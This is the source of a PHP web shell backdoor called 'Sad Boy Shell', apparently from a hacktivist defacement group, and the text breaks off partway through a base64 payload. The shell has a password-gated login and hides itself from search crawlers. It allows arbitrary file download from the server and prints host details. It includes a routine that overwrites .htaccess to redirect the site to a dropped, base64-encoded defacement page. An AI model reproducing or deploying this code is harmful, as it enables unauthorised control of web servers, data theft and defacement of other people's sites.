<?php
$auth_pass = "9cb06c34f3edc854092bdbcbdf092640"; 
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);


$color = "white";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
 
function login_shell() {
?>
<html>
<head>
<title>Sad Boy Shell</title>
<link href='http://i.imgur.com/7d5rIQm.png' rel='icon' type='image/x-icon'/>
<style type="text/css">
html {
     background:transparent;
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}
html,body{margin:0;padding:0;height:100%;font:10px Arial;}
#wrapper{min-height:100%;position:relative;}
#header{background:grey;padding:5px;height:50px;color:#3000ff;}
#body{padding-bottom:40px;padding-left:10px;}
#footer{background:black;position:absolute;bottom:0;width:100%;
   text-align:center;color:#408080;}
header {
    color: ;
    margin: 10px auto;
}

<link href='http://fonts.googleapis.com/css?family=Fauna+One' rel='stylesheet' type='text/css'>
<link rel='shortcut icon' href='http://moddingesp.es/favicon.ico'></link>

</style>
</head>
 
<center>

<link href='http://fonts.googleapis.com/css?family=Fauna+One' rel='stylesheet' type='text/css'>
<link rel='shortcut icon' href='http://moddingesp.es/favicon.ico'></link>

 
<header>
<pre>
    </pre>
</header>
<br><br><br><br><br><br><br><br>
<fieldset>
            <label for="login"
</form> <center><img src="https://3.bp.blogspot.com/-A8VAJ5ySsB0/XLynw1zeM0I/AAAAAAAAAew/VacQcG7afGIBmErDchvDypulTBlZ5L-JACLcBGAs/s1600/Sad%2BBoy.png " width="130" height="130"><center> 
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
</table><table width=100% ><tr><td align=center width=60% >
       <table border=3 width=100%><td width=25% align=right><font color=aqua size=4 face="comic sans ms"><td height="10" align="left" class="td1"></td></tr><tr>
<table border=3 width=100%><td width=25% align=right><font color=aqua size=4 face="comic sans ms"><td height="10" align="left" class="td1"></td></tr><tr><td<center><FONT COLOR="aqua"><FONT SIZE=8>====Sad Boy Shell====</FONT></center>
<table border=3 width=100%><td width=25% align=right><font color=aqua size=4 face="comic sans ms"><td height="10" align="left" class="td1"></td></tr><tr><td<center><FONT COLOR="white"><FONT SIZE=6>---Creator:Sad Boy 1922---</FONT></center>
        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="aqua" face="comic sans ms"size="1"><b> 
        <font color=aqua> 
        [=========================_________________________________________________________________</font><font color=red>_________________________________________</font><font color=aqua>_____________________________=========================]</font><br><font color=aqua><br>
	
<form method="post">
	<div>
Username
  	 <input type="text" username="nama" placeholder="Sad Boy 1922" />
  	</div>
Password
<input type="password" name="pass"> <br><br>
<input type="submit" value="Submit">
</fieldset>
</form>
<style>
</style>
</head>
<font color="aqua" style="text-shadow: 3px 3px 9px white; font-size: 12px;">
<pre>
<body>
<script language="JavaScript">
var text=" Login first with password bro  ";
var delay=100;
var currentChar=1;
var destination="[none]";
function type()
{
//if (document.all)
{
var dest=document.getElementById(destination);
if (dest)// && dest.innerHTML)
{
dest.innerHTML=text.substr(0, currentChar)+"<blink>_</blink>";
currentChar++;
if (currentChar>text.length)
{
currentChar=1;
setTimeout("type()", 5000);
}
else
{
setTimeout("type()", delay);
}
}
}
}
function startTyping(textParam, delayParam, destinationParam)
{
text=textParam;
delay=delayParam;
currentChar=1;
destination=destinationParam;
type();
}
</script> <b><div 0px="" 12px="" arial="" color:="" aqua="" font:="" id="textDestination" margin:="" style="background-color:grey;"></div></b> <script language="JavaScript">
javascript:startTyping(text, 35, "textDestination");
</script>

<form name="news">
<textarea cols="70" name="news2" rows="3" wrap="virtual"></textarea></form>
<script type="text/javascript">
//<![CDATA[
var newsText = new Array();
newsText[0] = "..Anonymous root shell by silent ghost";
newsText[1] = "....//Team Off silent Ghost Operation Cyber;)";
newsText[2] = "....<[Game Over admin]>";
newsText[3] = ".....Your System is under Control";
newsText[4] = "...We are Silent Ghost...we are not hacker we are not defacer..We are profesional security";
newsText[5] = ".....//we Grow together";
newsText[6] = "...Fuck For Conspiracy";
newsText[7] = "..We are Silent Ghost We are Illusion..we are Silent";
newsText[8] = "....Not Found!!!!!";
newsText[9] = " ....//Have a nice day:)!";
var ttloop = 1; // diulang-ulang teksnya ganti dengan 1 (1 = True; 0 = False)
var tspeed = 75; // kecepatan ngetik (larger number = slower)
var tdelay = 10; // waktu ngetik
// ------------- Di larang edit bangsad -------------
var dwAText, cnews=0, eline=0, cchar=0, mxText;
function doNews() {
mxText = newsText.length - 1;
dwAText = newsText[cnews];
setTimeout("addChar()",1000)
}
function addNews() {
cnews += 1;
if (cnews <= mxText) {
dwAText = newsText[cnews];
if (dwAText.length != 0) {
document.news.news2.value = "";
eline = 0;
setTimeout("addChar()",tspeed)
}
}
}
function addChar() {
if (eline!=1) {
if (cchar != dwAText.length) {
nmttxt = ""; for (var k=0; k<=cchar;k++) nmttxt += dwAText.charAt(k);
document.news.news2.value = nmttxt;
cchar += 1;
if (cchar != dwAText.length) document.news.news2.value += "_";
} else {
cchar = 0;
eline = 1;
}
if (mxText==cnews && eline!=0 && ttloop!=0) {
cnews = 0; setTimeout("addNews()",tdelay);
} else setTimeout("addChar()",tspeed);
} else {
setTimeout("addNews()",tdelay)
}
}
doNews()
//]]>
</script>
  <HTML><FONT COLOR="#FF0000"><FONT SIZE=4>Silent</FONT><FONT COLOR="#FFff00"><FONT SIZE=5>_</FONT><FONT COLOR="#00ff00"><FONT SIZE=4>Ghost</FONT><FONT COLOR="#00ffff"><FONT SIZE=5>_</FONT><FONT COLOR="#0000ff"><FONT SIZE=4>Team</FONT><FONT COLOR="#FF00ff"><FONT SIZE=5>!!!!</FONT></HTML>
<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/473310102/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>


<p id="pesan"></p>
<div style="position: fixed; bottom: 0px; left: 10px;width:90px;height:100px;"><a href="https://ngarayw.blogspot.com/?m=1" target="_blank"><img border="0" src="https://1.bp.blogspot.com/-T_8quA51Z_g/XA25u1HvATI/AAAAAAAAAKA/ClJkEuJU8XIPRT_ZsZub5vZN-0CFAyYTgCLcBGAs/s1600/tenor%252831%2529.gif" title="Awokwokwok" alt="animasi bergerak gif" /></a><small><center><a href="https://www.sadboy1922.zone.id" target="_blank">My Blog Sad Boy</a></center></small></div>
<script>
function konfirmasi(){
var tanya = confirm("Silent Ghost Was Here");

if(tanya === true) {
pesan = "Defaced by team silent ghost";
}else{
pesan = "Sad Boy watching you";
}

document.getElementById("pesan").innerHTML = pesan;
}
</script>
<font color="white" style="text-shadow: 3px 3px 9px aqua;">
<pre>
<center><FONT COLOR="white"><FONT SIZE=14>Grets :</FONT></center>
<marquee><center><FONT COLOR="white"><FONT SIZE=10>Silent Ghost -Purworejo Getar -Banyumas Cyber Team -Electronic Thunderbolt -Black Coder Crush -Dark Exploit Cyber -AnonGhost -Hacker patah-hati -Muslim Cyber Security -Panda 7w7 -Tangerang Blackhat -IndoXploit -Foush Army Hacktivist -Blackhat Hacker Indonesia -Indonesian Fighter Cyber -And all Hacktivist On indonesian</FONT></center></marquee>


<script>
var pesan = prompt("input your password first:");
if(pesan!= ""){
document.getElementById("pesan").innerHTML = "login : " + pesan;
}
</script>


<html>
<head>
<body>
</style>


<!-- Live Chat Widget powered by https://keyreply.com/chat/ -->
<!-- Advanced options: -->
<!-- data-align="left" -->
<!-- data-overlay="true" -->
<script data-align="right" data-overlay="false" id="keyreply-script" src="//keyreply.com/chat/widget.js" data-color="#FFEB3B" data-apps="JTdCJTIyd2hhdHNhcHAlMjI6JTIyMDg5Njg1MDM5NDA1JTIyLCUyMmVtYWlsJTIyOiUyMnJheXcxOTIyQGdtYWlsLmNvbSUyMiU3RA=="></script>
   
</script>
<center><FONT COLOR="green"><FONT SIZE=4>My Friend:</FONT></center>
<marquee>
<center><FONT COLOR="gold"><FONT SIZE=4>|Achilles ||| Rusmana  ||| Van_ZuidDe |||| Mr. PinkDha |||| mr.mα¦§@ |||| king salman |||| Mr.N4w4Nu6 |||| ←Mr.Exd |||| KIYAY_DAN |||| marshall
11. J ||| Gladysh_dysh |||| Satiya'24 ||||   ð3¢¦Bayor Parasite ||| Miaw |||| Oca-Oca|||| Ghost Mr.SoUrchID/ |||| FR05H |||| Anon wolf |||| Micro clone |||| Holilul anwar |||| ibnu syawal |||omest |||| endrian zen |||| Z0x id||||  Mr_Bl4cK_H4T10 |||| Phantom Blitz and all friend</FONT></center></marquee>
  <HTML><FONT COLOR="#FF0000"><FONT SIZE=4>Copyright</FONT><FONT COLOR="#FFff00"><FONT SIZE=5>_</FONT><FONT COLOR="#00ff00"><FONT SIZE=4>2019</FONT><FONT COLOR="#00ffff"><FONT SIZE=5>_</FONT><FONT COLOR="#0000ff"><FONT SIZE=4>Sad Boy</FONT><FONT COLOR="#FF00ff"><FONT SIZE=5>1922</FONT></HTML>
<center>
<center>
<font color="aqua" style="text-shadow: 3px 3px 9px #19f211; font-size: 12px;">
<pre>  
    ____________Powered_By_Sad_Boy_1922_____________
|  ssssd.       pq.        kkko.           bbbb.     ooo.  :Y:      :Y: |
|  $:             p.    p.     k.      k.        b.     b.  o.     o  :Y:  :Y:    |
|  ssssq.    p===p.    k.       k === bbbbb. o.       o.   :Y:       |
|         :$    p.        p.   k.     k.         b.    b.    o.    o.     :I:        |
|  ssssd /p.           p\ kkko.          bbbb.       ooo.      :I:        |
|____________________________________________________|    
|     <========[]===]Sad Boy Shell[===[]========>.       |
|  _____________Ransomware__Edition________________|              
</font>                                                  
====Sad Boy Shell Backdoor====

 -[ Contact : <font color="aqua" style="text-shadow: 3px 3px 9px #19f211; font-size: 12px;">rayw1912@gmail.com </font>]-
</pre>
</pre>

   


<style type="text/css">
<style>

body{

background-image:url(https://1.bp.blogspot.com/-sto8Pl0IPJ4/XPqbt_RPZDI/AAAAAAAAAkQ/UqoAs9kWodUs1XYdbaofQJxkexxzGLFJQCLcBGAs/s1600/20190604_211017.jpg); background-size:cover});

background-size:cover;

background-attachment: fixed;

}

p{

color:white;

}


body{
	
}
a {
text-decoration:none;
}
a:hover{
border-bottom:1px solid #00ff00;
}
*{
	font-size:11px;
	font-family:Tahoma,Verdana,Arial;
	color:aqua;
}
#menu{
	background:#111111;
	margin:8px 2px 4px 2px;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:grey;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
}
#menu a:hover{
	background:#191919;
	border-bottom:1px solid #333333;
	border-top:1px solid #333333;
}
.tabnet{
	margin:15px auto 0 auto;
	border: 1px solid #333333;
}
.main {
	width:100%;
}
.gaya {
	color:aqua;
}
.inputz{
	background:#111111;
	border:0;
	padding:2px;
	border-bottom:1px solid #222222;
	border-top:1px solid #222222;
}
.inputzbut{
	background:grey;
	color:aqua;
	margin:0 4px;
	border:1px solid #444444;

}
.inputz:hover, .inputzbut:hover{
	border-bottom:1px solid aqua;
	border-top:1px solid #00ff00;
}
.output {
	margin:auto;
	border:1px solid #00ff00;
	width:100%;
	height:400px;
	background:grey;
	padding:0 2px;
}
.cmdbox{
	width:100%;
}
.head_info{
	padding: 0 4px;
}
.jaya{ font-family: ;}

.sadboy{
	font-size:30px;
	padding:0;
	color:aqua;
}
.sadboy_tbl{
	text-align:center;
	margin:0 4px 0 0;
	padding:0 4px 0 0;
	border-right:1px solid aqua;
}
.phpinfo table{
	width:100%;
	padding:0 0 0 0;
}
.phpinfo td{
	background:#111111;
	color:#cccccc;
padding:6px 8px;;
}
.phpinfo th, th{
	background:#191919;
	border-bottom:1px solid #333333;
font-weight:normal;
}
.phpinfo h2, .phpinfo h2 a{
	text-align:center;
	font-size:16px;
	padding:0;
	margin:30px 0 0 0;
	background:gold;
	padding:4px 0;
}
.explore{
width:100%;
}
.explore a {
text-decoration:none;
}
.explore td{
border-bottom:1px solid aqua;
padding:0 8px;
line-height:24px;
}
.explore th{
padding:3px 8px;
font-weight:normal;
}
.explore th:hover , .phpinfo th:hover{
border-bottom:1px solid #00ff00;
}
.explore tr:hover{
background:#111111;
}
.viewfile{
background:#EDECEB;
color:aqua;
margin:4px 2px;
padding:8px;
}
.sembunyi{
display:none;
padding:0;margin:0;
}

</style></head>
<script language='javascript'>
if (document.all||document.getElementById){
var thetitle=document.title
document.title=''
}
var data="Fuck";
var done=1;
function statusIn(text){
decrypt(text,22,22);
}
function statusOut(){
self.status='';
done=1;
}
function decrypt(text, max, delay){
if (done){
done = 0;
rantit(text, max, delay, 0, max);
} 
}
function rantit(text, runs_left, delay, charvar, max){
if (!done){
runs_left = runs_left - 1;
var status = text.substring(0,charvar);
for(var current_char = charvar; current_char < text.length; current_char++){
status += data.charAt(Math.round(Math.random()*data.length));
}
document.title = status;
var rerun = "rantit('" + text + "'," + runs_left + "," + delay + "," + charvar + "," + max + ");"
var new_char = charvar + 1;
var next_char = "rantit('" + text + "'," + max + "," + delay + "," + new_char + "," + max + ");"
if(runs_left > 0){
setTimeout(rerun, delay);
}
else{
if (charvar < text.length){
setTimeout(next_char, Math.round(delay*(charvar+3)/(charvar+1)));
}
else
{
done = 1;
}
}
}
}
if (document.all||document.getElementById)
statusIn(thetitle)
</script>



<STYLE>

body{

background-image:url(https://1.bp.blogspot.com/-sto8Pl0IPJ4/XPqbt_RPZDI/AAAAAAAAAkQ/UqoAs9kWodUs1XYdbaofQJxkexxzGLFJQCLcBGAs/s1600/20190604_211017.jpg); background-size:cover});

background-size:cover;

background-attachment: fixed;

}

p{

color:white;

}



<style>
#formKomentar{
    border: 5px solid #d1d1d1;
    width:500px;
    padding:10px;
}
	
#formKomentar{
    border: 5px solid #d1d1d1;
    width:500px;
    padding:10px;
}



 textarea{
     padding: 10px;
     border:3px solid #e6e6e6;
     border-radius: 5px;
     margin-bottom: 15px; 
}

input, textarea{
     padding: 10px;
     border:3px solid #e6e6e6;
     border-radius: 5px;
     margin-bottom: 15px; 
}

Tilik lagi hasilnya

3

input:focus, textarea:focus{
    border:3px solid #5E4F4F;
}

textarea{
    width:300px;
}
1
2
3
4
5
6
7
	
input:focus, textarea:focus{
    border:3px solid #5E4F4F;
}
 
textarea{
    width:300px;
}

input[type="submit"]{
     cursor: pointer;
     background: -webkit-linear-gradient(top, #efefef, #ddd);
     background: -moz-linear-gradient(top, #efefef, #ddd);
     background: -ms-linear-gradient(top, #efefef, #ddd);
     background: -o-linear-gradient(top, #efefef, #ddd);
     background: linear-gradient(top, #efefef, #ddd);
     color: #333;
     text-shadow: 0px 1px 1px rgba(255,255,255,1);
     border: 1px solid #ccc;
}

input[type="submit"]:hover {
     background: -webkit-linear-gradient(top, #eee, #ccc);
     background: -moz-linear-gradient(top, #eee, #ccc);
     background: -ms-linear-gradient(top, #eee, #ccc);
     background: -o-linear-gradient(top, #eee, #ccc);
     background: linear-gradient(top, #eee, #ccc);
     border: 1px solid #bbb;
}

	
input[type="submit"]{
     cursor: pointer;
     background: -webkit-linear-gradient(top, #efefef, #ddd);
     background: -moz-linear-gradient(top, #efefef, #ddd);
     background: -ms-linear-gradient(top, #efefef, #ddd);
     background: -o-linear-gradient(top, #efefef, #ddd);
     background: linear-gradient(top, #efefef, #ddd);
     color: #333;
     text-shadow: 0px 1px 1px rgba(255,255,255,1);
     border: 1px solid #ccc;
}
 
input[type="submit"]:hover {
     background: -webkit-linear-gradient(top, #eee, #ccc);
     background: -moz-linear-gradient(top, #eee, #ccc);
     background: -ms-linear-gradient(top, #eee, #ccc);
     background: -o-linear-gradient(top, #eee, #ccc);
     background: linear-gradient(top, #eee, #ccc);
     border: 1px solid #bbb;
}

</html>

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
<script language=\'javascript\'>
function hide_div(id)
{
  document.getElementById(id).style.display = \'none\';
  document.cookie=id+\'=0;\';
}
function show_div(id)
{
  document.getElementById(id).style.display = \'block\';
  document.cookie=id+\'=1;\';
}
function change_divst(id)
{
  if (document.getElementById(id).style.display == \'none\')
    show_div(id);
  else
    hide_div(id);
}
</script>';
</font>
</body>
</head>
<table border="0" cellspacing="1" cellpadding="4" class="tborder"><tr><td class="thead"><strong></strong></td></tr><tr><td class="trow1"></a></td></tr></table><br />
<table border="0" cellspacing="1" cellpadding="4" class="tborder">
<tbody><tr>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
</center>
<center><img src=" https://3.bp.blogspot.com/-A8VAJ5ySsB0/XLynw1zeM0I/AAAAAAAAAew/VacQcG7afGIBmErDchvDypulTBlZ5L-JACLcBGAs/s1600/Sad%2BBoy.png " width="250" height="250"><center>        
<?php 
		echo $head ;
		echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
</table><table width=100% ><tr><td align=center width=60% >
       <table border=3 width=100%><td width=25% align=right><font color=aqua size=4 face="comic sans ms"><td height="10" align="left" class="td1"></td></tr><tr><td<HTML><FONT COLOR="#FF0000"><FONT SIZE=8>Silent</FONT><FONT COLOR="#FFff00"><FONT SIZE=8>_</FONT><FONT COLOR="#00ff00"><FONT SIZE=8>Ghost</FONT><FONT COLOR="#00ffff"><FONT SIZE=8>_</FONT><FONT COLOR="#0000ff"><FONT SIZE=8>Team</FONT><FONT COLOR="#FF00ff"><FONT SIZE=8>!!!!</FONT></HTML>
   
<table border=3 width=100%><td width=25% align=right><font color=aqua size=4 face="comic sans ms"><td height="10" align="left" class="td1"></td></tr><tr><td<center><FONT COLOR="aqua"><FONT SIZE=8>====Sad Boy Shell====</FONT></center>
<table border=3 width=100%><td width=25% align=right><font color=aqua size=4 face="comic sans ms"><td height="10" align="left" class="td1"></td></tr><tr><td<center><FONT COLOR="white"><FONT SIZE=6>------Creator:Sad Boy 1922---</FONT></center>
        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="aqua" face="comic sans ms"size="1"><b> 
        <font color=aqua> 
        [=========================___________________________________________________________________________</font><font color=red>_________________________________________</font><font color=aqua>_______________________________________=========================]</font><br><font color=aqua><br>

<style>

body{

background-image:url(https://1.bp.blogspot.com/-sto8Pl0IPJ4/XPqbt_RPZDI/AAAAAAAAAkQ/UqoAs9kWodUs1XYdbaofQJxkexxzGLFJQCLcBGAs/s1600/20190604_211017.jpg); background-size:cover});

background-size:cover;

background-attachment: fixed;

}

p{

color:white;

}


<script language="JavaScript">
var text=" Copyright 2019 Sad Boy 1922  ";
var delay=100;
var currentChar=1;
var destination="[none]";
function type()
{
//if (document.all)
{
var dest=document.getElementById(destination);
if (dest)// && dest.innerHTML)
{
dest.innerHTML=text.substr(0, currentChar)+"<blink>_</blink>";
currentChar++;
if (currentChar>text.length)
{
currentChar=1;
setTimeout("type()", 5000);
}
else
{
setTimeout("type()", delay);
}
}
}
}
function startTyping(textParam, delayParam, destinationParam)
{
text=textParam;
delay=delayParam;
currentChar=1;
destination=destinationParam;
type();
}
</script> <b><div 0px="" 12px="" arial="" color:="" red="" font:="" id="textDestination" margin:="" style="background-color:black;"></div></b> <script language="JavaScript">
javascript:startTyping(text, 35, "textDestination");
</script>
	<a href="http://www.devilscafe.in"><font color=black>Sad Boy Shell</font></a>
           </table>

'; 
?>

</head>

<body bgcolor="black"><body bgcolor="black">
	
	<table border=1 width=100%><td width=15% align=right><font color=aqua size=-2 face="comic sans ms">Server<br>server_ip<br>ip<br>server_software<br>disabled_functions</td><td><?php echo "<font size=-2>".php_uname()  ;?>	<br><?php echo "<font size=-2>".gethostbyname($_SERVER["HTTP_HOST"]);?><br><?php echo $_SERVER['REMOTE_ADDR'];?><br><?php echo $s_software = getenv("SERVER_SOFTWARE"); ?><br><?php $r=ini_get('disable_functions') ? ini_get('disable_functions'):'none'; echo $r;?>
	</table><?php echo $head ; ?><table width=100% ><tr><td align=center width=60% >


<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/473310102/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>


<p id="pesan"></p>
<div style="position: fixed; bottom: 0px; left: 10px;width:90px;height:100px;"><a href="https://ngarayw.blogspot.com/?m=1" target="_blank"><img border="0" src="https://1.bp.blogspot.com/-T_8quA51Z_g/XA25u1HvATI/AAAAAAAAAKA/ClJkEuJU8XIPRT_ZsZub5vZN-0CFAyYTgCLcBGAs/s1600/tenor%252831%2529.gif" title="Awokwokwok" alt="animasi bergerak gif" /></a><small><center><a href="https://www.sadboy1922.zone.id" target="_blank">My Blog Sad Boy</a></center></small></div>
<script>
function konfirmasi(){
var tanya = confirm("Silent Ghost Was Here");

if(tanya === true) {
pesan = " by team silent ghost";
}else{
pesan = "Sad Boy watching you";
}

document.getElementById("pesan").innerHTML = pesan;
}
</script>


<html>
<head>


<!-- Live Chat Widget powered by https://keyreply.com/chat/ -->
<!-- Advanced options: -->
<!-- data-align="left" -->
<!-- data-overlay="true" -->
<script data-align="right" data-overlay="false" id="keyreply-script" src="//keyreply.com/chat/widget.js" data-color="#FFEB3B" data-apps="JTdCJTIyd2hhdHNhcHAlMjI6JTIyMDg5Njg1MDM5NDA1JTIyLCUyMmVtYWlsJTIyOiUyMnJheXcxOTIyQGdtYWlsLmNvbSUyMiU3RA=="></script>

<script language="JavaScript">
var text=" Chose Tools What Do you Want  ";
var delay=100;
var currentChar=1;
var destination="[none]";
function type()
{
//if (document.all)
{
var dest=document.getElementById(destination);
if (dest)// && dest.innerHTML)
{
dest.innerHTML=text.substr(0, currentChar)+"<blink>_</blink>";
currentChar++;
if (currentChar>text.length)
{
currentChar=1;
setTimeout("type()", 5000);
}
else
{
setTimeout("type()", delay);
}
}
}
}
function startTyping(textParam, delayParam, destinationParam)
{
text=textParam;
delay=delayParam;
currentChar=1;
destination=destinationParam;
type();
}
</script> <b><div 0px="" 12px="" arial="" color:="" aqua="" font:="" id="textDestination" margin:="" style="background-color:grey;"></div></b> <script language="JavaScript">
javascript:startTyping(text, 35, "textDestination");
</script>
<!DOCTYPE html>
<html>
<head>
   <title>====Sad Boy Shell====</title>
<style type="text/css">
body {
    color: aqua;
}

<link href='http://fonts.googleapis.com/css?family=Fauna+One' rel='stylesheet' type='text/css'>
<link rel='shortcut icon' href='http://moddingesp.es/favicon.ico'></link>
.inpute{
    border-style: dotted;
    border-color: aqua;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border: 0px dotted gray;
    border-color: aqua;
    background-color: transparent;
    color: green;
}
.submite{
    border: 1px dotted gray;
    border-color: aqua;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware {
    public function shcpackInstall() {
        if (!file_exists(".sadboy1922")) {
            rename(".htaccess", ".sadboy");
            if (fwrite(fopen('.htaccess', 'w'), "#sad
DirectoryIndex fox.php
ErrorDocument 404 /sadboy1922.php")) {
                echo '<i class="fa fa-smile-o" aria-hidden="true"></i> .htaccess (Ransomware .htaccess file)<br>';
            }
            if (file_put_contents("sadboy1922.php", base64_decode("PGh0bWw+Cgo8c3R5bGU+Cgpib2R5ewoKYmFja2dyb3VuZC1pbWFnZTp1cmwoaHR0cHM6Ly8xLmJwLmJsb2dzcG90LmNvbS8tc3RvOFBsMElQSjQvWFBxYnRfUlBaREkvQUFBQUFBQUFBa1EvVXFvQXM5a1dvZFVzMVhZZGJhb2ZRSnhrZXh4ekdMRkpRQ0xjQkdBcy9zMTYwMC8yMDE5MDYwNF8yMTEwMTcuanBnKTtiYWNrZ3JvdW5kLXNpemU6Y292ZXJ9KTsKCmJhY2tncm91bmQtc2l6ZTpjb3ZlcjsKCmJhY2tncm91bmQtYXR0YWNobWVudDogZml4ZWQ7Cgp9CgpwewoKY29sb3I6d2hpdGU7Cgp9Cgo8L3N0eWxlPgoKPHRhYmxlIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjAiIGNsYXNzPSJ0YjEiID4KPC90YWJsZT48dGFibGUgd2lkdGg9MTAwJSA+PHRyPjx0ZCBhbGlnbj1jZW50ZXIgd2lkdGg9NjAlID4KICAgICAgCjx0YWJsZSBib3JkZXI9NiB3aWR0aD0xMDAlPjx0ZCB3aWR0aD0yNSUgYWxpZ249cmlnaHQ+PGZvbnQgY29sb3I9YXF1YSBzaXplPTcgZmFjZT0iY29taWMgc2FucyBtcyI+PHRkIGhlaWdodD0iMTAiIGFsaWduPSJsZWZ0IiBjbGFzcz0idGQxIj48L3RkPjwvdHI+PHRyPjx0ZDxjZW50ZXI+PEZPTlQgQ09MT1I9ImFxdWEiPjxGT05UIFNJWkU9MTQ+PT09PVNpbGVudCBHaG9zdD09PT08L0ZPTlQ+PC9jZW50ZXI+Cjx0YWJsZSBib3JkZXI9NiB3aWR0aD0xMDAlPjx0ZCB3aWR0aD0yNSUgYWxpZ249cmlnaHQ+PGZvbnQgY29sb3I9YXF1YSBzaXplPTQgZmFjZT0iY29taWMgc2FucyBtcyI+PHRkIGhlaWdodD0iMTAiIGFsaWduPSJsZWZ0IiBjbGFzcz0idGQxIj48L3RkPjwvdHI+PHRyPjx0ZDxjZW50ZXI+PEZPTlQgQ09MT1I9IndoaXRlIj48Rk9OVCBTSVpFPTEzPi0tLURlZmFjZWQgQnkgU2FkIEJveSAxOTIyLS0tPC9GT05UPjwvY2VudGVyPgogICAgICAgIDx0ZCBoZWlnaHQ9IjEwIiBhbGlnbj0ibGVmdCIgY2xhc3M9InRkMSI+PC90ZD48L3RyPjx0cj48dGQgCiAgICAgICAgd2lkdGg9IjEwMCUiIGFsaWduPSJjZW50ZXIiIHZhbGlnbj0idG9wIiByb3dzcGFuPSIxIj48Zm9udCAKICAgICAgICBjb2xvcj0iYXF1YSIgZmFjZT0iY29taWMgc2FucyBtcyJzaXplPSIxIj48Yj4gCiAgICAgICAgPGZvbnQgY29sb3I9YXF1YT4gCiAgICAgICAgWz09PT09PT09PT09PT09PT09PT09PT09PT1fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX188L2ZvbnQ+PGZvbnQgY29sb3I9cmVkPl9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fPC9mb250Pjxmb250IGNvbG9yPWFxdWE+X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fPT09PT09PT09PT09PT09PT09PT09PT09PV08L2ZvbnQ+PGJyPjxmb250IGNvbG9yPWFxdWE+PGJyPgoJCgoKPGJvZHkgYmdjb2xvcj0iYmxhY2siPjxib2R5IGJnY29sb3I9ImdyZXkiPgoJPC90YWJsZT48P3BocCBlY2hvICRoZWFkIDsgPz48dGFibGUgd2lkdGg9MTAwJSA+PHRyPjx0ZCBhbGlnbj1jZW50ZXIgd2lkdGg9NjAlID4KCjxsaW5rIGhyZWY9J2h0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVNoYXJlK1RlY2grTW9ubyknIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8bGluayByZWw9J3Nob3J0Y3V0IGljb24nIGhyZWY9J2h0dHA6Ly9tb2RkaW5nZXNwLmVzL2Zhdmljb24uaWNvJz48L2xpbms+Cgo8Zm9udCBjb2xvcj0iYXF1YSIgc3R5bGU9InRleHQtc2hhZG93OiA1cHggNXB4IDlweCB3aGl0ZTsgZm9udC1zaXplOiAyMHB4OyI+CjxwcmU+Cgo8bGluayBocmVmPSdodHRwOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1GYXVuYStPbmUnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8bGluayByZWw9J3Nob3J0Y3V0IGljb24nIGhyZWY9J2h0dHA6Ly9tb2RkaW5nZXNwLmVzL2Zhdmljb24uaWNvJz48L2xpbms+Cgo8IS0tIEhhY2tlZCAtLT4KPGZvbnQgY29sb3I9IndoaXRlIiBzdHlsZT0idGV4dC1zaGFkb3c6IDVweCA1cHggOXB4IHdoaXRlO